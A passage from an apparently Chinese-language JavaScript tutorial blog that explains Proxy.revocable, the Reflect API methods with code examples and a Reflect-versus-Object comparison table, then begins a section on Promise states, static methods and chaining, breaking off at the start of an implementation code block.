执行操作</span><br></code></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol><li>Reflect API：通常与 Reflect 对象配合使用，确保正确的 this 绑定</li><li>性能影响：Proxy 操作比直接访问属性慢，避免在性能关键路径上过度使用</li><li>目标对象不可变：Proxy 代理不会改变目标对象本身</li><li>this 绑定：Proxy 内部方法中的 this 指向 handler 对象</li><li>可撤销代理：可以使用 Proxy.revocable() 创建可撤销的代理</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> &#123; proxy, revoke &#125; = <span class="hljs-title class_">Proxy</span>.<span class="hljs-title function_">revocable</span>(&#123;&#125;, &#123;&#125;);<br><span class="hljs-title function_">revoke</span>(); <span class="hljs-comment">// 此后对代理的任何操作都会抛出错误</span><br></code></pre></td></tr></table></figure><h2 id="Reflect-详解"><a href="#Reflect-详解" class="headerlink" title="Reflect 详解"></a>Reflect 详解</h2><h3 id="什么是Reflect？"><a href="#什么是Reflect？" class="headerlink" title="什么是Reflect？"></a>什么是Reflect？</h3><p>Reflect 是 ES6 引入的一个内置对象，它提供了一组静态方法用于操作对象，这些方法与 Proxy 的拦截方法一一对应。Reflect 的设计目的是为了：</p><p>（1）将一些明显属于语言内部的方法转移到 JavaScript 代码层，比如 Object.defineProperty 未来只能通过 Reflect 对象访问</p><p>（2）提供更合理的返回值（用布尔值代替抛出异常）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 老写法</span><br><span class="hljs-keyword">try</span> &#123;<br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(target, property, attributes);<br>  <span class="hljs-comment">// success</span><br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>  <span class="hljs-comment">// failure</span><br>&#125;<br><br><span class="hljs-comment">// 新写法</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">defineProperty</span>(target, property, attributes)) &#123;<br>  <span class="hljs-comment">// success</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// failure</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（3）统一操作对象的函数式 API，将对象操作都变成函数式行为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 老写法</span><br><span class="hljs-string">&#x27;assign&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-title class_">Object</span> <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 新写法</span><br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">has</span>(<span class="hljs-title class_">Object</span>, <span class="hljs-string">&#x27;assign&#x27;</span>) <span class="hljs-comment">// true</span><br><br></code></pre></td></tr></table></figure><p>（4）为 Proxy 提供默认行为的基础方法，让 Proxy 对象可以更方便的调用对应的 Reflect 方法，完成默认行为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> obj = &#123;&#125;<br><span class="hljs-keyword">var</span> obj2 = &#123;&#125;<br><span class="hljs-keyword">var</span> proxyHandler = &#123;<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) &#123;<br>    <span class="hljs-comment">// todo</span><br>  &#125;<br>&#125;<br><span class="hljs-keyword">var</span> reflectHandler = &#123;<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(...<span class="hljs-variable language_">arguments</span>)<br>  &#125;<br>&#125;<br><span class="hljs-keyword">var</span> proxyObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj, proxyHandler)<br><span class="hljs-keyword">var</span> reflectObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj2, reflectHandler)<br><br>proxyObj.<span class="hljs-property">a</span> = <span class="hljs-number">1</span><br>reflectObj.<span class="hljs-property">a</span> = <span class="hljs-number">1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxyObj) <span class="hljs-comment">// &#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(reflectObj) <span class="hljs-comment">// &#123;a: 1&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Reflect-核心方法详解"><a href="#Reflect-核心方法详解" class="headerlink" title="Reflect 核心方法详解"></a>Reflect 核心方法详解</h3><p><strong>Reflect.get(target, propertyKey[, receiver])</strong></p><ul><li>获取对象属性的值</li><li>等同于 target[propertyKey]</li><li>receiver 参数可以改变 getter 中的 this 指向</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">2</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj, <span class="hljs-string">&#x27;x&#x27;</span>)); <span class="hljs-comment">// 1</span><br><br><span class="hljs-comment">// 改变 getter 中的 this</span><br><span class="hljs-keyword">const</span> obj2 = &#123;<br>  <span class="hljs-attr">foo</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">bar</span>() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">foo</span>;<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">const</span> receiver = &#123; <span class="hljs-attr">foo</span>: <span class="hljs-number">2</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj2, <span class="hljs-string">&#x27;bar&#x27;</span>, receiver)); <span class="hljs-comment">// 2</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.set(target, propertyKey, value[, receiver])</strong></p><ul><li>设置对象属性的值</li><li>等同于 target[propertyKey] &#x3D; value</li><li>返回布尔值表示是否设置成功</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">name</span>); <span class="hljs-comment">// &#x27;Alice&#x27;</span><br><br><span class="hljs-comment">// 改变 setter 中的 this</span><br><span class="hljs-keyword">const</span> obj2 = &#123;<br>  <span class="hljs-keyword">set</span> <span class="hljs-title function_">prop</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = value;<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">const</span> receiver = &#123;&#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(obj2, <span class="hljs-string">&#x27;prop&#x27;</span>, <span class="hljs-number">10</span>, receiver);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(receiver.<span class="hljs-property">bar</span>); <span class="hljs-comment">// 10</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.has(target, propertyKey)</strong></p><ul><li>判断对象是否包含某属性</li><li>等同于 propertyKey in target</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">has</span>(obj, <span class="hljs-string">&#x27;name&#x27;</span>)); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">has</span>(obj, <span class="hljs-string">&#x27;toString&#x27;</span>)); <span class="hljs-comment">// true (继承属性)</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.deleteProperty(target, propertyKey)</strong></p><ul><li>删除对象的某属性</li><li>等同于 delete target[propertyKey]</li><li>返回布尔值表示是否删除成功</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">2</span> &#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">deleteProperty</span>(obj, <span class="hljs-string">&#x27;x&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj); <span class="hljs-comment">// &#123; y: 2 &#125;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.construct(target, argumentsList[, newTarget])</strong></p><ul><li>调用构造函数创建实例</li><li>等同于 new target(…args)</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">construct</span>(<span class="hljs-title class_">Person</span>, [<span class="hljs-string">&#x27;Alice&#x27;</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">name</span>); <span class="hljs-comment">// &#x27;Alice&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.apply(target, thisArgument, argumentsList)</strong></p><ul><li>调用函数</li><li>等同于 Function.prototype.apply.call(target, thisArgument, argumentsList)</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;name&#125;</span>!`</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">apply</span>(greet, <span class="hljs-literal">null</span>, [<span class="hljs-string">&#x27;Alice&#x27;</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// &#x27;Hello, Alice!&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.defineProperty(target, propertyKey, attributes)</strong></p><ul><li>定义或修改对象属性</li><li>等同于 Object.defineProperty()</li><li>返回布尔值表示是否成功</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-keyword">const</span> success = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">defineProperty</span>(obj, <span class="hljs-string">&#x27;name&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;Bob&#x27;</span>,<br>  <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span><br>&#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(success); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">name</span>); <span class="hljs-comment">// &#x27;Bob&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.getOwnPropertyDescriptor(target, propertyKey)</strong></p><ul><li>获取属性描述符</li><li>等同于 Object.getOwnPropertyDescriptor()</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;;<br><span class="hljs-keyword">const</span> desc = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(obj, <span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(desc.<span class="hljs-property">value</span>); <span class="hljs-comment">// &#x27;Alice&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(desc.<span class="hljs-property">enumerable</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.getPrototypeOf(target)</strong></p><ul><li>获取对象的原型对象</li><li>等同于 Object.getPrototypeOf()</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj) === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.setPrototypeOf(target, prototype)</strong></p><ul><li>设置对象的原型对象</li><li>等同于 Object.setPrototypeOf()</li><li>返回布尔值表示是否设置成功</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-keyword">const</span> proto = &#123; <span class="hljs-attr">foo</span>: <span class="hljs-string">&#x27;bar&#x27;</span> &#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, proto);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">foo</span>); <span class="hljs-comment">// &#x27;bar&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.isExtensible(target)</strong></p><ul><li>判断对象是否可扩展</li><li>等同于 Object.isExtensible()</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">isExtensible</span>(obj)); <span class="hljs-comment">// true</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">preventExtensions</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">isExtensible</span>(obj)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.preventExtensions(target)</strong></p><ul><li>阻止对象扩展</li><li>等同于 Object.preventExtensions()</li><li>返回布尔值表示是否成功</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">1</span> &#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">preventExtensions</span>(obj);<br>obj.<span class="hljs-property">y</span> = <span class="hljs-number">2</span>; <span class="hljs-comment">// 静默失败或严格模式下报错</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj); <span class="hljs-comment">// &#123; x: 1 &#125;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.ownKeys(target)</strong></p><ul><li>获取对象所有自有属性键（包括 Symbol 和不可枚举属性）</li><li>等同于 Object.getOwnPropertyNames(target).concat(Object.getOwnPropertySymbols(target))</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;id&#x27;</span>)]: <span class="hljs-number">123</span>,<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span><br>&#125;;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj, <span class="hljs-string">&#x27;hidden&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;secret&#x27;</span>,<br>  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span><br>&#125;);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(obj)); <br><span class="hljs-comment">// [&#x27;name&#x27;, &#x27;age&#x27;, &#x27;hidden&#x27;, Symbol(id)]</span><br></code></pre></td></tr></table></figure><h3 id="为什么使用-Reflect？"><a href="#为什么使用-Reflect？" class="headerlink" title="为什么使用 Reflect？"></a>为什么使用 Reflect？</h3><p>除了上面讲过的 Reflect 的几个设计目的外，还包括下面的原因：</p><p><strong>支持 receiver 参数</strong></p><p>Reflect 的 get&#x2F;set 方法支持 receiver 参数，可改变 getter&#x2F;setter 中的 this 指向：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">_value</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> receiver = &#123; <span class="hljs-attr">_value</span>: <span class="hljs-number">42</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj, <span class="hljs-string">&#x27;value&#x27;</span>, receiver)); <span class="hljs-comment">// 42</span><br></code></pre></td></tr></table></figure><h3 id="Reflect和Object方法的区别"><a href="#Reflect和Object方法的区别" class="headerlink" title="Reflect和Object方法的区别"></a>Reflect和Object方法的区别</h3><table><thead><tr><th align="left">操作</th><th align="left">Object 方法</th><th align="left">Reflect 方法</th><th align="left">主要区别</th></tr></thead><tbody><tr><td align="left">获取属性描述符</td><td align="left">getOwnPropertyDescriptor</td><td align="left">getOwnPropertyDescriptor</td><td align="left">相同</td></tr><tr><td align="left">定义属性</td><td align="left">defineProperty</td><td align="left">defineProperty</td><td align="left">Reflect 返回布尔值而非对象</td></tr><tr><td align="left">获取原型</td><td align="left">getPrototypeOf</td><td align="left">getPrototypeOf</td><td align="left">Reflect 参数非对象会抛出错误</td></tr><tr><td align="left">设置原型</td><td align="left">setPrototypeOf</td><td align="left">setPrototypeOf</td><td align="left">Reflect 返回布尔值</td></tr><tr><td align="left">扩展性检查</td><td align="left">isExtensible</td><td align="left">isExtensible</td><td align="left">Reflect 参数非对象会抛出错误</td></tr><tr><td align="left">阻止扩展</td><td align="left">preventExtensions</td><td align="left">preventExtensions</td><td align="left">Reflect 返回布尔值</td></tr><tr><td align="left">属性枚举</td><td align="left">keys + getOwnPropertyNames</td><td align="left">ownKeys</td><td align="left">Reflect 返回所有键，包括不可枚举和 Symbol</td></tr><tr><td align="left">函数调用</td><td align="left">-</td><td align="left">apply</td><td align="left">无直接对应方法</td></tr><tr><td align="left">构造函数调用</td><td align="left">-</td><td align="left">construct</td><td align="left">无直接对应方法</td></tr><tr><td align="left">属性存在检查</td><td align="left">-</td><td align="left">has</td><td align="left">对应 in 操作符</td></tr><tr><td align="left">属性删除</td><td align="left">-</td><td align="left">deleteProperty</td><td align="left">对应 delete 操作符</td></tr></tbody></table><h1 id="Promise、Iterator-Generator、Async-Await"><a href="#Promise、Iterator-Generator、Async-Await" class="headerlink" title="Promise、Iterator&#x2F;Generator、Async&#x2F;Await"></a>Promise、Iterator&#x2F;Generator、Async&#x2F;Await</h1><h2 id="Promise：异步编程的基石"><a href="#Promise：异步编程的基石" class="headerlink" title="Promise：异步编程的基石"></a>Promise：异步编程的基石</h2><p><strong>核心概念</strong></p><ul><li>状态机：Promise 是一个状态机，包含三种状态：<ul><li>Pending（进行中）</li><li>Fulfilled（已成功）</li><li>Rejected（已失败）</li></ul></li><li>不可逆性：状态一旦改变（从 Pending → Fulfilled 或 Pending → Rejected）就不可逆转，会一直保持这个结果，这时就称为 resolved（已定型）</li></ul><p><strong>基本用法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// 异步操作</span><br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> success = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.5</span>;<br>    success ? <span class="hljs-title function_">resolve</span>(<span class="hljs-string">&#x27;操作成功&#x27;</span>) : <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;操作失败&#x27;</span>));<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;);<br><br>promise<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">result</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error))<br>  .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;无论成功失败都会执行&#x27;</span>));<br></code></pre></td></tr></table></figure><p><strong>Promise 静态方法</strong></p><table><thead><tr><th align="left">方法</th><th align="left">描述</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">Promise.resolve()</td><td align="left">创建已解决的 Promise</td><td align="left">Promise.resolve(42)</td></tr><tr><td align="left">Promise.reject()</td><td align="left">创建已拒绝的 Promise</td><td align="left">Promise.reject(new Error())</td></tr><tr><td align="left">Promise.all()</td><td align="left">所有 Promise 成功时才成功</td><td align="left">Promise.all([p1, p2])</td></tr><tr><td align="left">Promise.race()</td><td align="left">第一个完成的 Promise 决定结果</td><td align="left">Promise.race([p1, p2])</td></tr><tr><td align="left">Promise.allSettled()</td><td align="left">所有 Promise 完成后返回结果</td><td align="left">Promise.allSettled([p1, p2])</td></tr><tr><td align="left">Promise.any()</td><td align="left">任一 Promise 成功即成功</td><td align="left">Promise.any([p1, p2])</td></tr></tbody></table><p><strong>Promise 链式调用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;网络错误&#x27;</span>);<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">processData</span>(data))<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">processed</span> =&gt;</span> <span class="hljs-title function_">saveData</span>(processed))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-title function_">handleError</span>(error));<br></code></pre></td></tr></table></figure><p><strong>实现原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 